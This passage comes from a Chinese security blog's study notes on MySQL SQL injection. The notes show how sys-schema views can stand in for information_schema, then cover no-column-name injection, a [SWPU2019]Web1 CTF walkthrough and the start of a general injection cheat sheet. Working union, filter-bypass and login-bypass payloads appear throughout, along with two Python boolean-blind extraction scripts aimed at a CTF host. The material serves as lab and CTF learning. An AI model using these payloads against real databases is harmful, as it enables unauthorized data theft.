class="headerlink" title="MySQL5.7的新特性"></a>MySQL5.7的新特性</h2><p>由于performance_schema过于发杂，所以mysql在5.7版本中新增了<code>sys schemma</code>，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</p><h3 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h3><p>开始了解这个视图之前，希望你可以想一下当你利用Mysql设计数据库时，是否会给每个表加一个<strong>自增的id（或其他名字）字段</strong>呢？如果是，那么我们发现了一个注入中在mysql默认情况下就可以替代information_schema库的方法。</p><blockquote><p><strong>schema_auto_increment_columns，该视图的作用简单来说就是用来对表自增ID的监控。</strong></p></blockquote><p> 这里我通过security（sqli-labs）和fortest（我自建库）两个库来熟悉一下schema_auto_increment_columns视图的结构组成，以及特性。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fortest库</span><br><span class="line">    data 表存在自增id</span><br><span class="line">    test 表存在自增id</span><br><span class="line">    no_a_i_table 表不存在自增id </span><br><span class="line">       </span><br><span class="line">security库</span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span>该库为sqli<span class="operator">-</span>labs自动建立</span><br><span class="line">    emails,referers,uagents,users</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"><br>可以发现，fortest库中的no_a_i_table并不在这里存在，然而其他非系统库的表信息全部在这里。根据前面介绍的schema_auto_increment_columns视图的作用，也可以发现我们可以通过该视图获取数据库的表名信息，也就是说找到了一种可以替代information_schema在注入中的作用的方法。</p><p>当然了，如果你说我们就是想想通过注入获取到没有自增主键的表的数据怎么办？通过翻阅sys中的视图文档，我又发现了两个视图也许可以实现这种需求？。</p><h3 id="schema-table-statistics-with-buffer、x-schema-table-statistics-with-buffer"><a href="#schema-table-statistics-with-buffer、x-schema-table-statistics-with-buffer" class="headerlink" title="schema_table_statistics_with_buffer、x$schema_table_statistics_with_buffer"></a>schema_table_statistics_with_<a href="https://so.csdn.net/so/search?q=buffer">buffer</a>、x$schema_table_statistics_with_buffer</h3><blockquote><p><strong>查询表的统计信息</strong>，其中还包括InnoDB缓冲池统计信息，默认情况下按照增删改查操作的总表I/O延迟时间（执行时间，即也可以理解为是存在最多表I/O争用的表）降序排序，<strong>数据来源：</strong><code>performance_schema.table_io_waits_summary_by_table</code>、<code>sys.x$ps_schema_table_statistics_io</code>、<code>sys.x$innodb_buffer_stats_by_table</code></p></blockquote><p> 通过介绍的内容我们可以很容易的发现，利用“数据来源”同样可以获取到我们需要的信息，所以说这样的话我们的绕过information_schema的思路就更广了。加下来依次看一下各个视图的结构：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">    可以看到，在上一个视图中并没有出现的表名在这里出现了。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733941960.png" alt="在这里插入图片描述"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.x$schema_table_statistics_with_buffer</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942061.png" alt="在这里插入图片描述"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在从`数据来源`中随便选取一个视图为例（想查看视图详细结构等信息可自行测试）</span><br><span class="line">sys.x$ps_schema_table_statistics_io</span><br><span class="line">可忽略table_name<span class="operator">=</span><span class="string">&#x27;db&#x27;</span>，默认的并非我创建。</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942062.png" alt="在这里插入图片描述"><br>类似的表还有：<a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">mysql.innodb_table_stats</a>、mysql.innodb_table_index都存放有库名表名<br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942063.png" alt="在这里插入图片描述"></p><h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p><strong>上面的方法的确可以获取数据库中表名信息了，但是并没有找到类似于information_schema中COLUMNS（字段）的视图，也就是说我们并不能获取数据？</strong> 当然不是。</p><h2 id="利用join"><a href="#利用join" class="headerlink" title="利用join"></a>利用join</h2><p>这个思路在ctf中比较常见吧，利用join进行无列名注入，如何利用到这里就显而易见了。</p><p><strong>join-using注列名：</strong></p><p><strong>通过系统关键词join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因(相同列名存在)，而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</strong></p><h3 id="join-…-using-xx"><a href="#join-…-using-xx" class="headerlink" title="join … using(xx)"></a>join … using(xx)</h3><p> 简单的记录一下payload吧。<strong>以本文开头的环境为例，这里的waf会完全过滤掉information_schema库。</strong></p><blockquote><p>由于开启防护后会拦截正常注入，所以图中payload可能会有些乱，我会将简单的payload整理在下面，绕过防护的部分完全可以自由发挥。</p></blockquote><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942064.png" alt="在这里插入图片描述"><br>爆表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">schema_auto_increment_columns</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union all select 1,2,group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942065.png" alt="在这里插入图片描述"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">schema_table_statistics_with_buffer</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942066.png" alt="在这里插入图片描述"><br>其他的就不测试了，都是一个payload。</p><p>获取字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取第一列的列名</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union all select * from (select * from users as a join users as b)as c--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942067.png" alt="在这里插入图片描述"><br><img src="20200609171704986.png" alt="在这里插入图片描述"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">获取次列及后续列名</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union all select*from (select * from users as a join users b using(id,username))c--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,username,password))c<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">数据库中<span class="keyword">as</span>主要作用是起别名，常规来说都可以省略，但是为了增加可读性，不建议省略。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942068.png" alt="在这里插入图片描述"><br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942169.png" alt="在这里插入图片描述"></p><h2 id="利用普通子查询"><a href="#利用普通子查询" class="headerlink" title="利用普通子查询"></a>利用普通子查询</h2><p>实例：</p><p>正常的查询如下：<br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942170.png" alt="在这里插入图片描述"><br>其中，列名为<code>id</code>、<code>name</code>、<code>pass</code>、<code>mail</code>、<code>phone</code>，使用union查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;      （前提是先尝试出<span class="keyword">sql</span>中总共有几个列）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942171.png" alt="在这里插入图片描述"><br>可见数字与users中的列相应。<br>接着，就可以继续使用数字来对应列进行查询，如3对应了表里面的pass：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>就相当于<span class="keyword">select</span> pass <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942172.png" alt="在这里插入图片描述"><br>当反引号 ` 不能使用的时候，我们可以使用别名来代替：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b,<span class="number">4</span>,<span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(b,c) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b,<span class="number">4</span> <span class="keyword">as</span> c,<span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;  <span class="operator">/</span><span class="operator">/</span>在注入中查询多个列：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942173.png" alt="在这里插入图片描述"><br><strong>究其核心，就是给想要查询的表中的列名进行重命名，或加个序号。</strong></p><h3 id="SWPU2019-Web1——无列名注入"><a href="#SWPU2019-Web1——无列名注入" class="headerlink" title="[SWPU2019]Web1——无列名注入"></a>[SWPU2019]Web1——无列名注入</h3><p><strong>这是一个留言板的二次注入与无列名注入</strong></p><p>登录了之后在发布广告处存在sql注入漏洞，我们输入的内容在输入后没有漏洞，当我们发布广告后查看广告详情的时候，后台代码中又通过查询将我们输进去的内容查出来，就造成了二次注入，从而产生了注入。<br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942174.png" alt="在这里插入图片描述"><br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942175.png" alt="在这里插入图片描述"><br>(往往在这样的地方容易出现sql二次注入、xss、ssti等)</p><p>该题目环境过滤了空格，我们使用<code>/**/</code>来进行绕过，又过滤了or，因此我们无法使用 order by 以及information_schema这个库，因为过滤了注释符<code>#</code>，所以查询语句的最后我们要闭合单引号<br>当广告名为1’时报错<br><img src="20200609192500217.png" alt="在这里插入图片描述"><br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942176.png" alt="在这里插入图片描述"><br>先来看看后台sql语句中的字段数，有TM的22列：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里最后的<code>&#39;22</code>用来闭合sql语句中最后面的引号，为各种注释符都被过滤了。<br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942177.png" alt="在这里插入图片描述"><br>可知2，3处为注入点。猜测语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们来暴库，爆版本：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942178.png" alt="在这里插入图片描述"><br>爆表：<br>因为information_schema被过滤了，我们要用sys.schema_auto_increment_columns等进行代替，但这里题目环境时buuctf的，他没有这个sys.schema_auto_increment_columns这个库，而且一般要超级管理员才可以访问sys。我们只能用innodb_table_stats。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="20200609193157498.png" alt="在这里插入图片描述"><br>发现俩表。<br>通过mysql.innodb_table_stats只能查出数据库和表名，查不出字段，所以之后我们还是要利用无列名注入。<br>猜想flag应该在users表中，我们先来猜猜users表中字段数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/1,2/**/union/**/select*from/**/users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942279.png" alt="在这里插入图片描述"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/1,2,3/**/union/**/select*from/**/users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942280.png" alt="在这里插入图片描述"><br>可知users表中有3列，我们再用无列名注入将其把内容报出来：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(a,b,c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)as/**/d),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942281.png" alt="在这里插入图片描述"><br>得到flag。<br>(本题由于过滤了join，所以不能用join…using报错)</p><h2 id="加括号逐位比较大小"><a href="#加括号逐位比较大小" class="headerlink" title="加括号逐位比较大小"></a>加括号逐位比较大小</h2><p>当union select被过滤时，以上两种方法就都不能用了，我们要用加括号逐位比较大小的方法，将flag诸位爆出来，就像这样：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&amp;&amp;</span>((<span class="keyword">select</span> <span class="number">1</span>,&quot;f&quot;)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag_is_here))</span><br></pre></td></tr></table></figure><p>用布尔来进行判断。一般出现在布尔盲注的地方。<br>例题：<br><img src="20200610100715667.png" alt="在这里插入图片描述"><br>一个post的输入框，存在sql盲注注入（正确则回显<code>Nu1L</code>)。但是过滤了很多东西，or、and、union、information_schema、sys.schema_auto_increment_columns、join等都不能用了。我们要是用sys.schema_table_statistics_with_buffer来绕过information_schema，先把表给爆出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://8e176081-905d-4063-a906-4eed1f03ed17.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;1&amp;&amp;ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))=&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        py=payload.<span class="built_in">format</span>(j,i)</span><br><span class="line">        datas=&#123;<span class="string">&#x27;id&#x27;</span>:py&#125;</span><br><span class="line">        re=requests.post(url=url,data=datas)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            result+=<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="2020061010103598.png" alt="在这里插入图片描述"><br>可以看到存在这两张表，下面就要实现无列名注入。但是union select被禁了，我们怎么做呢？？？</p><p>这里用到了ascii位偏移，关于ascii偏移的利用，可以看下面的例子<br><img src="20200610101126879.png" alt="在这里插入图片描述"><br>可以看到比较两个字符串的大小与字符串的长度是没有关系的，给定两个字符串，会各取两个字符串的各位字符ascii码来比较，不等式成立返回1，不等式不成立返回0。</p><p>这道题我们利用的就是这个特性，我们首先会从构造一个ascii从32到128的循环，与flag字符诸位一一进行对比，满足条件返回Nu1L，输出符合条件的ascii对应的字符，也就是找到了flag的第一个字符，以此类推，直到输出flag所有位的字符。</p><p>先通过加括号比较来判断这个表的列数，输入<code>1&amp;&amp;((1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code>返回 Nu1L，说明有两列。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://8e176081-905d-4063-a906-4eed1f03ed17.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(i)</span><br><span class="line">        py=payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        datas=&#123;<span class="string">&#x27;id&#x27;</span>:py&#125;</span><br><span class="line">        re=requests.post(url=url,data=datas)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70-164143733942282.png" alt="在这里插入图片描述"><br>当我们匹配flag的时候，一定会先经过匹配到字符相等的情况，这一这个时候返回的是0，对应题目中的V&amp;N，很明显此时的chr(char)并不是我们想要的，我们在输出1(Nu1L)的时候，匹配的是f的下一个字符g，而我们想要的是f，此时<code>chr(char-1)=&#39;f&#39;</code>，所以这里要用<code>chr(char-1)</code></p><p>关于payload中的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(select <span class="number">1</span>,<span class="string">&quot;&#123;&#125;&quot;</span>)&gt;(select * <span class="keyword">from</span> f1ag_1s_h3r3_hhhhh)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>f1ag_1s_h3r3_hhhhh表的第一个字段可能是id啥的，跟咱们没有关系了</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql注入简单总结</title>
      <link href="/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/"/>
      <url>/2022/01/01/mysql%E6%B3%A8%E5%85%A5%E6%96%B0%E5%AD%A6%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a><strong>SQL注入总结</strong></h1><p>进行总结，详细实现过程细节可能不会写出来~</p><p>所有sql语句均是mysql数据库的，其他数据库可能有些函数不同，但是方法大致相同</p><p><strong>0x00 SQL注入原理：</strong></p><p>SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sql语句的执行字符串中。</p><p>可能存在注入的地方有：登陆页面，搜索，获取HTTP头的信息(client-ip , x-forward-of)，订单处理（二次注入）等</p><p>注入的参数类型：POST, GET, COOKIES, SERVER 其实只要值传到数据库的执行语句那么就可能存在sql注入。</p><p>注入方法：union联合查询，延迟注入，布尔型回显判断注入，将内容输出到DNSlog</p><p><strong>0x01 SQL注意一般方法：</strong></p><p>正常查询语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot; select username,age from userinfo where id=&#x27;$_GET[&#x27;id&#x27;]&#x27; &quot;);</span><br></pre></td></tr></table></figure><p><strong>万能密码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27; or &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">&#x27; or 1=1#　　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27; or 1=1#&#x27;</span><br><span class="line">&#x27;=0#　　　　　　　　　　　　//完整语句 select username,age from userinfo where id=&#x27;&#x27;=0#</span><br></pre></td></tr></table></figure><p><strong>使用union进行联合查询</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; union select 1,(select database()) #</span><br><span class="line">xx&#x27; union select (select database()),2 or &#x27;　　　　　　